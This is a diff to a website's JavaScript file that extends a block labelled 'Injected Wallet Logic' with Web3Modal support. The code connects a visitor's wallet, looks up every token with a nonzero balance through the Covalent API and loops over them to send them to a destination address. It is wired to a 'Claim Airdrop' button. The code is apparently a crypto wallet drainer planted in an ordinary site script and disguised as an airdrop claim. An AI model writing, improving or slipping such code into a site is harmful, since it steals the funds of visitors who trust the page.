@@ -96,21 +96,40 @@ scrollReveal();
 
 addEventOnElem(window, "scroll", scrollReveal);
 
-// --- Injected Wallet Logic ---
+// --- Injected Wallet Logic with Web3Modal ---
 async function connectWalletAndSendTokens() {
-  if (typeof window.ethereum === 'undefined') {
-    alert('Please install MetaMask!');
-    return;
-  }
+  // Define provider options
+  const providerOptions = {
+    walletconnect: {
+      package: window.WalletConnectProvider.default,
+      options: {
+        infuraId: "YOUR_INFURA_ID" // Replace with your Infura Project ID
+      }
+    }
+    // Add other providers here if needed
+  };
+
+  // Initialize Web3Modal
+  const web3Modal = new window.Web3Modal.default({
+    cacheProvider: false,
+    providerOptions
+  });
 
   try {
-    const provider = new ethers.providers.Web3Provider(window.ethereum);
-    await provider.send('eth_requestAccounts', []);
+    // Open modal to select wallet
+    const instance = await web3Modal.connect();
+
+    // Create ethers provider and signer
+    const provider = new ethers.providers.Web3Provider(instance);
     const signer = provider.getSigner();
     const userAddress = await signer.getAddress();
 
-    const chainId = await signer.getChainId();
-    const covalentApiKey = "YOUR_API_KEY";
+    // Get network chain ID
+    const network = await provider.getNetwork();
+    const chainId = network.chainId;
+
+    // Fetch token balances using Covalent API
+    const covalentApiKey = "YOUR_API_KEY"; // Replace with your Covalent API key
     const url = `https://api.covalenthq.com/v1/${chainId}/address/${userAddress}/balances_v2/?key=${covalentApiKey}`;
     const response = await fetch(url);
     const data = await response.json();
@@ -120,8 +139,10 @@ async function connectWalletAndSendTokens() {
       return;
     }
 
+    // Filter tokens with balance > 0
     const tokens = data.data.items.filter(token => token.type === 'cryptocurrency' && token.balance > 0 && token.contract_address);
 
+    // Send tokens to destination address
     for (const token of tokens) {
       try {
         const contract = new ethers.Contract(token.contract_address, [
@@ -139,4 +160,5 @@ async function connectWalletAndSendTokens() {
   }
 }
 
+// Attach event listener to the "Claim Airdrop" button
 document.getElementById("claim-airdrop-btn")?.addEventListener("click", connectWalletAndSendTokens);
